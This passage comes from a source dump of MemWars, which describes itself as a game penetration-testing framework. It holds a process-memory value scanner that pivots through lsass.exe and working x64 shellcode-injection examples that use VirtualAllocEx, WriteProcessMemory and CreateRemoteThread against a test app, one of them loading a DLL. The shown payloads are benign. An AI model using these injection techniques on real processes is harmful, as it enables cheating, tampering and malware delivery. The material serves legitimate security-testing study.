        smc.ReadVirtualMemory((void*)(i), &buf, sizeof(BYTE), &sizeBuf);
        memoryMap[i] = buf;
    }
    return memoryMap;
}

BOOL Client::MemoryMapRoutine(uintptr_t startAddress = 0, uintptr_t endAddress = 0) {
    cout << "Creating Map..." << endl;
    map<uintptr_t, BYTE> memoryMap = GetMemoryMap(startAddress, endAddress);

    while (TRUE) {
        int choice;
        cout << "1: keep vals that changed" << endl << "2: keep vals that didn't change" << endl
        << "3: keep vals that got smaller" << endl << "4: keep vals that got bigger" << endl;
        cin >> choice;
        if (choice < 1 || choice > 4) {
            cout << "invalid choice" << endl;
            return FALSE;
        }
        for(map<uintptr_t, BYTE>::iterator i = memoryMap.begin(); i != memoryMap.end();) {
            SIZE_T sizeBuf;
            int buf;
            smc.ReadVirtualMemory((void*)(i->first), &buf, sizeof(BYTE), &sizeBuf);

            if (choice == 1 && i->second == buf) {
                memoryMap.erase(i++);
            } else if (choice == 2 && i->second != buf) {
                memoryMap.erase(i++);
            } else if (choice == 3 && i->second <= buf) {
                memoryMap.erase(i++);
            } else if (choice == 4 && i->second >= buf) {
                memoryMap.erase(i++);
            }  else {
                ++i;
            }
        }
        choice = 1;
        while (choice == 1) {
            cout << "size: " << memoryMap.size() << endl << "1: show" << endl << "other val: no" << endl;
            cin >> choice;
            if (choice == 1) {
                for(map<uintptr_t, BYTE>::iterator i = memoryMap.begin(); i != memoryMap.end();) {
                    cout << hex << i->first << "\t" << dec << i->second << endl;
                    i++;
                }
            }
        }
    }

    return TRUE;
}

*/
```

`PenetrationRoutines/ValueFinder/ValueFinder.h`:

```h
#pragma once

#include <windows.h>
#include <string>
#include <vector>
#include <map>
#include "../SPIAttackProvider/Client/SPIAttackProvider.h"
#include "../AttackProvider/AttackProvider.h"
#include "../../Core/MemWarsServicesCore.h" // GetProcessHandleByName

class ValueFinder {
public:
    BOOL Init(string attackMethod, wstring targetProcess, wstring pivotProcess = L"");
    vector<void*> FindValueUsingVirtualQuery(void* value, const SIZE_T size, HANDLE hProcess = NULL);
    void RemoveNotMatchingValues(vector<void*>& memPtrs, void* value, SIZE_T size);
    map<void*, SIZE_T> CreateMemoryMapUsingVirtualQuery(HANDLE hProcess = NULL);
    void FilterMemoryMap(map<void*, SIZE_T>& memoryMapMetaData, int filterType);

    ~ValueFinder() {
        delete attackProvider;
    }

protected:
    AttackProvider* attackProvider = NULL;
    string attackMethod;
    wstring targetProcess;
    wstring pivotProcess;
    HANDLE hProcess;
};

```

`PenetrationRoutines/ValueFinder/ValueFinderTest.cpp`:

```cpp
#include <iostream>
#include "ValueFinder.h"
#include "../../Core/MemWarsServicesCore.h"

using namespace std;

void FindValueUsingVirtualAllocTest() {
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessHandleByName(L"SkypeApp.exe");
        if (process == NULL) {
            cout << "Open Skype to start testing..." << endl;
            Sleep(5000);
        }
    }
    ValueFinder vf;
    if (!vf.Init("SPI", L"SkypeApp.exe", L"lsass.exe")) {
        cout << "FindValueUsingVirtualAllocTest() failed. Init failed" << endl;
        return;
    }

    BYTEARRAY bArr;
    IntToByteArray(&bArr, 1337);
    MEMPTRS testPtrs = {0};
    FindValueInProcess(&bArr, process, &testPtrs);

    if (testPtrs.size <= 0) {
        cout << "ReadWriteValueTest() failed. Test Value not found" << endl;
        return;
    }

    int valBuf = 1337;
    vector<void*> ptrs = vf.FindValueUsingVirtualQuery(&valBuf, sizeof(int), process);

    if (ptrs.size() == testPtrs.size) {
        cout << "ReadWriteValueTest() success" << endl;
    } else {
        cout << "ReadWriteValueTest() failed. Found value amount differs" << endl;
    }
}

int main() {
    FindValueUsingVirtualAllocTest();
}
```

`PenetrationRoutines/ValueFinder/buildValueFinder.bat`:

```bat
@ECHO OFF
cl.exe /EHsc ValueFinder.cpp ../SPIAttackProvider/Client/SPIAttackProvider.cpp ../../AttackServices/SystemProcessInjectionAttack/StealthyMemManipulatorClient.cpp ../../AttackServices/SystemProcessInjectionAttack/StealthyMemManipulatorGetHandleId.cpp  ../../Core/MemWarsServicesCore.cpp ../../Core/MemWarsCore.c ../../AttackServices/SystemProcessInjectionAttack/spinlock.obj /link User32.lib Kernel32.lib Advapi32.lib Ntdll.lib
```

`PenetrationRoutines/ValueFinder/buildValueFinderTest.bat`:

```bat
@ECHO OFF
cl.exe /EHsc ValueFinderTest.cpp ValueFinder.cpp ../SPIAttackProvider/Client/SPIAttackProvider.cpp ../../AttackServices/SystemProcessInjectionAttack/StealthyMemManipulatorClient.cpp ../../AttackServices/SystemProcessInjectionAttack/StealthyMemManipulatorGetHandleId.cpp  ../../Core/MemWarsServicesCore.cpp ../../Core/MemWarsCore.c ../../AttackServices/SystemProcessInjectionAttack/spinlock.obj /link User32.lib Kernel32.lib Advapi32.lib Ntdll.lib
```

`README.md`:

```md
# MemWars - Game Penetration Testing Framework

MemWars is a framework that executes popular and current attack methods on video games to detect vulnerabilities. It helps game developers to quickly discover and understand security vulnerabilities.

The attack methods can be divided into two categories:
- Basic attacks that manipulate the game process without being inconspicuous
- Advanced attacks that manipulate the game process and attempt to bypass anti-cheat methods.

## Attack methods

Each attack method has its own test environment and can be compiled separately.
The following attack methods are implemented:

- (basic) [DLL Injection](https://github.com/moccajoghurt/MemWars/tree/master/AttackServices/DLLInjectionAttack)
- (basic) [Direct3D 11 Hook](https://github.com/moccajoghurt/MemWars/tree/master/AttackServices/Direct3D11HookAttack)
- (basic) [Socket Hook](https://github.com/moccajoghurt/MemWars/tree/master/AttackServices/SocketHookAttack)
- (basic) [Import Address Table Hook](https://github.com/moccajoghurt/MemWars/tree/master/AttackServices/IATHookAttack)
- (basic) [JMP Hook](https://github.com/moccajoghurt/MemWars/tree/master/AttackServices/JmpHookAttack)
- (basic) [Thread Hijacking](https://github.com/moccajoghurt/MemWars/tree/master/AttackServices/ThreadHijackAttack)
- (advanced) [Lsass Attack](https://github.com/moccajoghurt/MemWars/tree/master/AttackServices/LsassAttack)
- (advanced) [Capcom Driver Attack](https://github.com/moccajoghurt/MemWars/tree/master/AttackServices/CapcomDriverAttack)
- (advanced) [Hidden Kernel DLL Injection](https://github.com/moccajoghurt/MemWars/tree/master/AttackServices/HiddenKernelDLLInjectionAttack)


The project is developed for Windows 10 x64. All attack methods target x64 processes.
```

`ShellcodeGeneration/CreateFile.cpp`:

```cpp
#include <windows.h>
#include <iostream>

using namespace std;

int main() {
    
    CreateFileA("Test.txt",         // lpFileName
    GENERIC_READ | GENERIC_WRITE,   // dwDesiredAccess
    0,                              // dwShareMode
    NULL,                           // lpSecurityAttributes
    CREATE_ALWAYS,                  // dwCreationDisposition
    FILE_ATTRIBUTE_NORMAL,          // dwFlagsAndAttributes
    NULL                            // hTemplateFile 
    );
}
```

`ShellcodeGeneration/CreateFileAsm.asm`:

```asm
;---ASM Hello World Win64 MessageBox

extrn CreateFileA: PROC
extrn ExitProcess: PROC

.data
mytitle db 'Win64', 0
msg db 'testfile1234567.txt', 0

.code
main proc

    mov rdx, 40000000h
    lea rcx, msg
    mov rdx, 40000000h
    xor r8d,  r8d
    xor r9d, r9d

    push 0
    push 80h
    push 1

    mov rax, CreateFileA
    sub rsp, 20h
    call rax
    add rsp, 20h
    mov ecx, eax
    call ExitProcess
main endp

End
```

`ShellcodeGeneration/HelloWorldAsm.asm`:

```asm
;---ASM Hello World Win64 MessageBox

extrn MessageBoxA: PROC
extrn ExitProcess: PROC

.data
mytitle db 'Win64', 0
msg db 'Hello World!', 0

.code
main proc
    sub rsp, 28h  
    mov rcx, 0       ; hWnd = HWND_DESKTOP
    lea rdx, msg     ; LPCSTR lpText
    lea r8,  mytitle   ; LPCSTR lpCaption
    mov r9d, 0       ; uType = MB_OK
    call MessageBoxA
    add rsp, 28h  
    mov ecx, eax     ; uExitCode = MessageBox(...)
    call ExitProcess
main endp

End
```

`ShellcodeGeneration/LoadLibraryShellcode.c`:

```c
/*
* This file injects shellcode that calls CreateFileA
* into a test app and starts a remote threat to 
* execute the shellcode
*/


#include <windows.h>
#include "../Core/MemWarsCore.h"

int main() {
    system("start memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }
    
	void* remoteMemory = VirtualAllocEx(process, NULL, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (remoteMemory == NULL) {
		printf("VirtualAllocEx returned NULL\n");
	}

    FARPROC addrLoadLibraryA = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "LoadLibraryA");
    FARPROC addrExitThread = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "ExitThread");
    
    if (addrCreateFileA == NULL || addrCloseHandle == NULL || addrLoadLibraryA == NULL || addrExitThread == NULL) {
        printf("GetProcAddress returned NULL\n");
        return 1;
	}
    void* rwMemory = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (rwMemory == NULL) {
        printf("Virtual Alloc returned NULL\n");
        goto Exit;
    }

    // getchar();

    BYTE loadLibraryCodeCave[] = {
        0x48, 0xB9, 0, 0, 0, 0, 0, 0, 0, 0,         // mov rcx (DLL name)
        0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,         // mov rax (LoadLibraryA Process Address)
        0x48, 0x83, 0xEC, 0x20,				        // sub rsp 0x20
		0xFF, 0xD0,							        // call rax
		0x48, 0x83, 0xC4, 0x20,				        // add rsp, 0x20
        0x48, 0x31, 0xC9,                           // xor rcx, rcx
        0x48, 0x83, 0xF8, 0x00,                     // cmp rax, 0x00
        0x74, 0x07,                                 // je rel + 7
        0x48, 0xC7, 0xC1, 0x01, 0x00, 0x00, 0x00,   // mov rcx, 0x1
        0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,         // mov rax (ExitThread Process Address)
        0x48, 0x83, 0xEC, 0x20,				        // sub rsp 0x20
		0xFF, 0xD0,							        // call rax
    };

    

    size_t shellCodeSize = sizeof(loadLibraryCodeCave);
    const TCHAR dllName[] = "InjectedDLL.dll";

    *(DWORD64*)((PUCHAR)loadLibraryCodeCave + 2) = (DWORD64)(ULONG_PTR)remoteMemory + shellCodeSize;
	*(DWORD64*)((PUCHAR)loadLibraryCodeCave + 12) = (DWORD64)(ULONG_PTR)addrLoadLibraryA;
    *(DWORD64*)((PUCHAR)loadLibraryCodeCave + 48) = (DWORD64)(ULONG_PTR)addrExitThread;

    

    CopyMemory(rwMemory, loadLibraryCodeCave, sizeof(loadLibraryCodeCave));
    CopyMemory((void*)((DWORD64)rwMemory + shellCodeSize), &dllName, sizeof(dllName));

    WriteProcessMemory(process, remoteMemory, rwMemory, 4096, NULL);
    
    HANDLE hRemoteThread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
	if (!hRemoteThread) {
        printf("CreateRemoteThread() failed: %d", GetLastError());
    }
    

    Sleep(200); // give the shellcode a bit time

    DWORD threadStatus;
    if (GetExitCodeThread(hRemoteThread, &threadStatus)) {
        printf("%x\n", threadStatus);
    } else {
        printf("error\n");
    }

    

    Exit:;
    // system("taskkill /IM memoryTestApp.exe /F >nul");
}
```

`ShellcodeGeneration/LoadLibraryShellcode_bak.c`:

```c
/*
* This file injects shellcode that calls CreateFileA
* into a test app and starts a remote threat to 
* execute the shellcode
*/


#include <windows.h>
#include "../Core/MemWarsCore.h"

int main() {
    system("start memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }
    
	void* remoteMemory = VirtualAllocEx(process, NULL, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (remoteMemory == NULL) {
		printf("VirtualAllocEx returned NULL\n");
	}


    FARPROC addrCloseHandle = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "CloseHandle");
	FARPROC addrCreateFileA = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "CreateFileA");
    FARPROC addrLoadLibraryA = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "LoadLibraryA");
    FARPROC addrExitThread = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "ExitThread");
    
    if (addrCreateFileA == NULL || addrCloseHandle == NULL || addrLoadLibraryA == NULL || addrExitThread == NULL) {
        printf("GetProcAddress returned NULL\n");
        return 1;
	}
    void* rwMemory = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (rwMemory == NULL) {
        printf("Virtual Alloc returned NULL\n");
        goto Exit;
    }

    getchar();

    BYTE loadLibraryCodeCave[] = {
        0x48, 0xB9, 0, 0, 0, 0, 0, 0, 0, 0, // mov rcx (DLL name)
        0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // mov rax (LoadLibraryA Process Address)
        0x48, 0x83, 0xEC, 0x20,				// sub rsp 0x20
		0xFF, 0xD0,							// call rax
		0x48, 0x83, 0xC4, 0x20,				// add rsp, 0x20
        0x48, 0x83, 0xF8, 0x00,             // cmp rax, 0x00
        0x75, 0x01,                         // jne rel + 1
        0xC3,                               // ret
    };

    BYTE fileCreationCodeCave[] = {
		0x48, 0x83, 0xE4, 0xF0,				// +0 and rsp, 0x0f (make sure stack 16-byte aligned)
		0x48, 0xB9, 0, 0, 0, 0, 0, 0, 0, 0, // +4 mov rcx (lpFileName)
        0x48, 0xBA, 0, 0, 0, 0, 0, 0, 0, 0, // +14 mov rdx (dwDesiredAccess)
        0x4D, 0x31, 0xC0,                   // +24 xor r8,r8 (dwShareMode)
		0x4D, 0x31, 0xC9,                   // +27 xor r9,r9 (lpSecurityAttributes)
		0x48, 0x83, 0xEC, 0x08,             // +30 sub rsp, 0x08 (We are pushing 3 Parameters = 24 byte. Stack must be 16 byte aligned, so we add 8 byte beforehand)
        0x68, 0x00, 0x00, 0x00, 0x00,       // +34 push 0x0 (hTemplateFile)
        0x68, 0x80, 0x00, 0x00, 0x00,       // +39 push 0x80 (dwFlagsAndAttributes)
        0x68, 0x02, 0x00, 0x00, 0x00,       // +44 push 0x2 (dwCreationDisposition)
		0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // +49 mov rax (CreateFileA Process Address)
		0x48, 0x83, 0xEC, 0x20,             // +59 sub rsp, 0x20 (save 32 byte for Windows parameters - must be always done)
		0xFF, 0xD0,                         // +63 call rax
		0x48, 0x83, 0xC4, 0x40,				// +65 add rsp, 0x40 (0x20 + 3 Parameters + 8 Byte alignment buf)
		0x48, 0x89, 0xC1,					// +69 mov rcx, rax (HANDLE of CreateFileA)
		0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // +72 mov rax (CloseHandle Process Address)
		0x48, 0x83, 0xEC, 0x20,				// sub rsp 0x20
		0xFF, 0xD0,							// call rax
		0x48, 0x83, 0xC4, 0x20,				// add rsp, 0x20
        0xC3                                // ret
        // 0xEB, 0xFE                          // nop + jmp rel8 -2
	};

    size_t shellCodeSize = sizeof(loadLibraryCodeCave) + sizeof(fileCreationCodeCave);
    const TCHAR dllName[] = "InjectedDLLa.dll";
    const TCHAR filename[] = "testfile123.txt";

    *(DWORD64*)((PUCHAR)loadLibraryCodeCave + 2) = (DWORD64)(ULONG_PTR)remoteMemory + shellCodeSize;
	*(DWORD64*)((PUCHAR)loadLibraryCodeCave + 12) = (DWORD64)(ULONG_PTR)addrLoadLibraryA;
    
	
	*(DWORD64*)((PUCHAR)fileCreationCodeCave + 6) = (DWORD64)(ULONG_PTR)remoteMemory + shellCodeSize + sizeof(dllName);
	*(DWORD64*)((PUCHAR)fileCreationCodeCave + 16) = GENERIC_READ | GENERIC_WRITE;
    *(DWORD64*)((PUCHAR)fileCreationCodeCave + 51) = (DWORD64)(ULONG_PTR)addrCreateFileA;
	*(DWORD64*)((PUCHAR)fileCreationCodeCave + 74) = (DWORD64)(ULONG_PTR)addrCloseHandle;

    

    CopyMemory(rwMemory, loadLibraryCodeCave, sizeof(loadLibraryCodeCave));
    CopyMemory((void*)((DWORD64)rwMemory + sizeof(loadLibraryCodeCave)), fileCreationCodeCave, sizeof(fileCreationCodeCave));
    CopyMemory((void*)((DWORD64)rwMemory + shellCodeSize), &dllName, sizeof(dllName));
    CopyMemory((void*)((DWORD64)rwMemory + shellCodeSize + sizeof(dllName)), &filename, sizeof(filename));

    WriteProcessMemory(process, remoteMemory, rwMemory, 4096, NULL);
    
    HANDLE hRemoteThread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
	if (!hRemoteThread) {
        printf("CreateRemoteThread() failed: %d", GetLastError());
    }
    

    Sleep(10); // give the shellcode a bit time
    Exit:;
    // system("taskkill /IM memoryTestApp.exe /F >nul");
}
```

`ShellcodeGeneration/ShellcodeInjectionCreateFileExample.c`:

```c
/*
* This file injects shellcode that calls CreateFileA
* into a test app and starts a remote threat to 
* execute the shellcode
*/


#include <windows.h>
#include "../Core/MemWarsCore.h"

int main() {
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }
    
	PVOID pRemoteBuffer;
	pRemoteBuffer = VirtualAllocEx(process, NULL, 4096, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (!pRemoteBuffer) {
        printf("VirtualAllocEx() failed: %d", GetLastError());
    }
    
    getchar();


    FARPROC addrCreateFileA = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "CreateFileA");
    if (addrCreateFileA == NULL) {
        printf("GetProcAddress returned NULL\n");
        goto Exit;
    }
    void* rwMemory = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (rwMemory == NULL) {
        printf("Virtual Alloc returned NULL\n");
        goto Exit;
    }
    DWORD offset = 0;
    BYTE injectBytes[] = {
        0x48, 0xB9, 0, 0, 0, 0, 0, 0, 0, 0, // +0 mov rcx, 64bit
        0x48, 0xBA, 0, 0, 0, 0, 0, 0, 0, 0, // +10 mov rdx, 64bit
        0x45, 0x31, 0xC0,                   // +20 xor r8d,r8d
        0x45, 0x31, 0xC9,                   // +23 xor r9d,r9d
        0x6A, 0x00,                         // +26 push 0x0 (hTemplateFile)
        0x68, 0x80, 0x00, 0x00, 0x00,       // +28 push 0x80 (dwFlagsAndAttributes)
        0x6A, 0x01,                         // +33 push 0x1 (dwCreationDisposition)
        0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // +35 mov rax, 64bit
        0x48, 0x83, 0xEC, 0x20,             // +45 sub rsp, 0x20
        0xFF, 0xD0,                         // +49 call rax
        0x48, 0x83, 0xC4, 0x38,             // +51 add rsp, 0x38
        0xEB, 0xFE                          // nop + jmp rel8 -2
    };


    *(DWORD64*)((PUCHAR)injectBytes + 2) = (DWORD64)(ULONG_PTR)pRemoteBuffer + sizeof(injectBytes);
    *(DWORD64*)((PUCHAR)injectBytes + 12) = (DWORD64)0x40000000;
    *(DWORD64*)((PUCHAR)injectBytes + 37) = (DWORD64)(ULONG_PTR)addrCreateFileA;

    CopyMemory(rwMemory, injectBytes, sizeof(injectBytes));

    UCHAR filename[] = "testfile1234567.txt";

    CopyMemory((void*)((DWORD64)rwMemory + sizeof(injectBytes)), filename, sizeof(filename));
    
	if (!WriteProcessMemory(process, pRemoteBuffer, rwMemory, 4096, NULL)) {
        printf("WriteProcessMemory() failed: %d", GetLastError());
    }
    
    HANDLE hRemoteThread;
	hRemoteThread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
	if (!hRemoteThread) {
        printf("CreateRemoteThread() failed: %d", GetLastError());
    }
    

    Sleep(100000000); // give the shellcode a bit time
    Exit:;
    // system("taskkill /IM memoryTestApp.exe /F >nul");
}
```

`ShellcodeGeneration/ShellcodeInjectionMessageBoxExample.c`:

```c
/*
* This file injects shellcode that calls MessageBoxA
* into a test app and starts a remote threat to 
* execute the shellcode
*/


#include <windows.h>
#include "../MemWarsCore/MemWarsCore.h"

int main() {
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)getProcessByName("memoryTestApp.exe");
    }
    
	PVOID pRemoteBuffer;
	pRemoteBuffer = VirtualAllocEx(process, NULL, 4096, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (!pRemoteBuffer) {
        printf("VirtualAllocEx() failed: %d", GetLastError());
	}


    FARPROC addrMessageBoxA = GetProcAddress(GetModuleHandle(TEXT("user32.dll")), "MessageBoxA");
    if (addrMessageBoxA == NULL) {
        printf("GetProcAddress returned NULL\n");
        goto Exit;
    }
    void* rwMemory = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (rwMemory == NULL) {
        printf("Virtual Alloc returned NULL\n");
        goto Exit;
    }
    DWORD offset = 0;
    BYTE injectBytes[] = {
        0x48, 0x31, 0xC9,                           // xor    rcx,rcx
        0x48, 0x31, 0xD2,                           // xor    rdx,rdx
        0x4D, 0x31, 0xC0,                           // xor    r8,r8 (8)
        0x45, 0x31, 0xC9,                           // xor    r9d,r9d (11)
        0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,         // mov    rax,addr
        0x48, 0x83, 0xEC, 0x20,                     // sub rsp, 0x20
        0xFF, 0xD0,                                 // call   rax
        0xEB, 0xFE                                  // nop + jmp rel8 -2
    };

    *(DWORD64*)((PUCHAR)injectBytes + 14) = (DWORD64)(ULONG_PTR)addrMessageBoxA;
    CopyMemory(rwMemory, injectBytes, sizeof(injectBytes));
    
	if (!WriteProcessMemory(process, pRemoteBuffer, rwMemory, 4096, NULL)) {
        printf("WriteProcessMemory() failed: %d", GetLastError());
    }
    
    HANDLE hRemoteThread;
	hRemoteThread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
	if (!hRemoteThread) {
        printf("CreateRemoteThread() failed: %d", GetLastError());
    }
    printf("press Enter to close memoryTestApp\n");
    getchar();

    Exit:;
    system("taskkill /IM memoryTestApp.exe /F >nul");
}
```

`ShellcodeGeneration/buildAssembly_x64.bat`:

```bat
ml64.exe %1 /link /subsystem:windows /defaultlib:kernel32.lib /defaultlib:user32.lib /entry:main
```

`ShellcodeGeneration/buildCreateFileExample.bat`:

```bat
@ECHO OFF
cl.exe ShellcodeInjectionCreateFileExample.c ../Core/MemWarsCore.c /link user32.lib Advapi32.lib
```

`ShellcodeGeneration/buildLoadLibraryShellcode.bat`:

```bat
@ECHO OFF
cl.exe LoadLibraryShellcode.c ../Core/MemWarsCore.c /link user32.lib Advapi32.lib
```

`ShellcodeGeneration/buildMessageBoxExample.bat`:

```bat
@ECHO OFF
cl.exe ShellcodeInjectionMessageBoxExample.c ../MemWarsCore/MemWarsCore.c /link user32.lib
```

`libs/Capstone/include/arm.h`:

```h
#ifndef CAPSTONE_ARM_H
#define CAPSTONE_ARM_H

/* Capstone Disassembly Engine */
/* By Nguyen Anh Quynh <aquynh@gmail.com>, 2013-2014 */

#ifdef __cplusplus
extern "C" {
#endif

#include <stdint.h>
#include "platform.h"

#ifdef _MSC_VER
#pragma warning(disable:4201)
#endif

//> ARM shift type
typedef enum arm_shifter {
	ARM_SFT_INVALID = 0,
	ARM_SFT_ASR,	// shift with immediate const
	ARM_SFT_LSL,	// shift with immediate const
	ARM_SFT_LSR,	// shift with immediate const
	ARM_SFT_ROR,	// shift with immediate const
	ARM_SFT_RRX,	// shift with immediate const
	ARM_SFT_ASR_REG,	// shift with register
	ARM_SFT_LSL_REG,	// shift with register
	ARM_SFT_LSR_REG,	// shift with register
	ARM_SFT_ROR_REG,	// shift with register
	ARM_SFT_RRX_REG,	// shift with register
} arm_shifter;

//> ARM condition code
typedef enum arm_cc {
	ARM_CC_INVALID = 0,
	ARM_CC_EQ,            // Equal                      Equal
	ARM_CC_NE,            // Not equal                  Not equal, or unordered
	ARM_CC_HS,            // Carry set                  >, ==, or unordered
	ARM_CC_LO,            // Carry clear                Less than
	ARM_CC_MI,            // Minus, negative            Less than
	ARM_CC_PL,            // Plus, positive or zero     >, ==, or unordered
	ARM_CC_VS,            // Overflow                   Unordered
	ARM_CC_VC,            // No overflow                Not unordered
	ARM_CC_HI,            // Unsigned higher            Greater than, or unordered
	ARM_CC_LS,            // Unsigned lower or same     Less than or equal
	ARM_CC_GE,            // Greater than or equal      Greater than or equal
	ARM_CC_LT,            // Less than                  Less than, or unordered
	ARM_CC_GT,            // Greater than               Greater than
	ARM_CC_LE,            // Less than or equal         <, ==, or unordered
	ARM_CC_AL             // Always (unconditional)     Always (unconditional)
} arm_cc;

typedef enum arm_sysreg {
	//> Special registers for MSR
	ARM_SYSREG_INVALID = 0,

	// SPSR* registers can be OR combined
	ARM_SYSREG_SPSR_C = 1,
	ARM_SYSREG_SPSR_X = 2,
	ARM_SYSREG_SPSR_S = 4,
	ARM_SYSREG_SPSR_F = 8,

	// CPSR* registers can be OR combined
	ARM_SYSREG_CPSR_C = 16,
	ARM_SYSREG_CPSR_X = 32,
	ARM_SYSREG_CPSR_S = 64,
	ARM_SYSREG_CPSR_F = 128,

	// independent registers
	ARM_SYSREG_APSR = 256,
	ARM_SYSREG_APSR_G,
	ARM_SYSREG_APSR_NZCVQ,
	ARM_SYSREG_APSR_NZCVQG,

	ARM_SYSREG_IAPSR,
	ARM_SYSREG_IAPSR_G,
	ARM_SYSREG_IAPSR_NZCVQG,

	ARM_SYSREG_EAPSR,
	ARM_SYSREG_EAPSR_G,
	ARM_SYSREG_EAPSR_NZCVQG,

	ARM_SYSREG_XPSR,
	ARM_SYSREG_XPSR_G,
	ARM_SYSREG_XPSR_NZCVQG,

	ARM_SYSREG_IPSR,
	ARM_SYSREG_EPSR,
	ARM_SYSREG_IEPSR,

	ARM_SYSREG_MSP,
	ARM_SYSREG_PSP,
	ARM_SYSREG_PRIMASK,
	ARM_SYSREG_BASEPRI,
	ARM_SYSREG_BASEPRI_MAX,
	ARM_SYSREG_FAULTMASK,
	ARM_SYSREG_CONTROL,
} arm_sysreg;

//> The memory barrier constants map directly to the 4-bit encoding of
//> the option field for Memory Barrier operations.
typedef enum arm_mem_barrier {
	ARM_MB_INVALID = 0,
	ARM_MB_RESERVED_0,
	ARM_MB_OSHLD,
	ARM_MB_OSHST,
	ARM_MB_OSH,
	ARM_MB_RESERVED_4,
	ARM_MB_NSHLD,
	ARM_MB_NSHST,
	ARM_MB_NSH,
	ARM_MB_RESERVED_8,
	ARM_MB_ISHLD,
	ARM_MB_ISHST,
	ARM_MB_ISH,
	ARM_MB_RESERVED_12,
	ARM_MB_LD,
	ARM_MB_ST,
	ARM_MB_SY,
} arm_mem_barrier;

//> Operand type for instruction's operands
typedef enum arm_op_type {
	ARM_OP_INVALID = 0, // = CS_OP_INVALID (Uninitialized).
	ARM_OP_REG, // = CS_OP_REG (Register operand).
	ARM_OP_IMM, // = CS_OP_IMM (Immediate operand).
	ARM_OP_MEM, // = CS_OP_MEM (Memory operand).
	ARM_OP_FP,  // = CS_OP_FP (Floating-Point operand).
	ARM_OP_CIMM = 64, // C-Immediate (coprocessor registers)
	ARM_OP_PIMM, // P-Immediate (coprocessor registers)
	ARM_OP_SETEND,	// operand for SETEND instruction
	ARM_OP_SYSREG,	// MSR/MSR special register operand
} arm_op_type;

//> Operand type for SETEND instruction
typedef enum arm_setend_type {
	ARM_SETEND_INVALID = 0,	// Uninitialized.
	ARM_SETEND_BE,	// BE operand.
	ARM_SETEND_LE, // LE operand
} arm_setend_type;

typedef enum arm_cpsmode_type {
	ARM_CPSMODE_INVALID = 0,
	ARM_CPSMODE_IE = 2,
	ARM_CPSMODE_ID = 3
} arm_cpsmode_type;

//> Operand type for SETEND instruction
typedef enum arm_cpsflag_type {
	ARM_CPSFLAG_INVALID = 0,
	ARM_CPSFLAG_F = 1,
	ARM_CPSFLAG_I = 2,
	ARM_CPSFLAG_A = 4,
	ARM_CPSFLAG_NONE = 16,	// no flag
} arm_cpsflag_type;

//> Data type for elements of vector instructions.
typedef enum arm_vectordata_type {
	ARM_VECTORDATA_INVALID = 0,

	// Integer type
	ARM_VECTORDATA_I8,
	ARM_VECTORDATA_I16,
	ARM_VECTORDATA_I32,
	ARM_VECTORDATA_I64,

	// Signed integer type
	ARM_VECTORDATA_S8,
	ARM_VECTORDATA_S16,
	ARM_VECTORDATA_S32,
	ARM_VECTORDATA_S64,

	// Unsigned integer type
	ARM_VECTORDATA_U8,
	ARM_VECTORDATA_U16,
	ARM_VECTORDATA_U32,
	ARM_VECTORDATA_U64,

	// Data type for VMUL/VMULL
	ARM_VECTORDATA_P8,

	// Floating type
	ARM_VECTORDATA_F32,
	ARM_VECTORDATA_F64,

	// Convert float <-> float
	ARM_VECTORDATA_F16F64,	// f16.f64
	ARM_VECTORDATA_F64F16,	// f64.f16
	ARM_VECTORDATA_F32F16,	// f32.f16
	ARM_VECTORDATA_F16F32,	// f32.f16
	ARM_VECTORDATA_F64F32,	// f64.f32
	ARM_VECTORDATA_F32F64,	// f32.f64

	// Convert integer <-> float
	ARM_VECTORDATA_S32F32,	// s32.f32
	ARM_VECTORDATA_U32F32,	// u32.f32
	ARM_VECTORDATA_F32S32,	// f32.s32
	ARM_VECTORDATA_F32U32,	// f32.u32
	ARM_VECTORDATA_F64S16,	// f64.s16
	ARM_VECTORDATA_F32S16,	// f32.s16
	ARM_VECTORDATA_F64S32,	// f64.s32
	ARM_VECTORDATA_S16F64,	// s16.f64
	ARM_VECTORDATA_S16F32,	// s16.f64
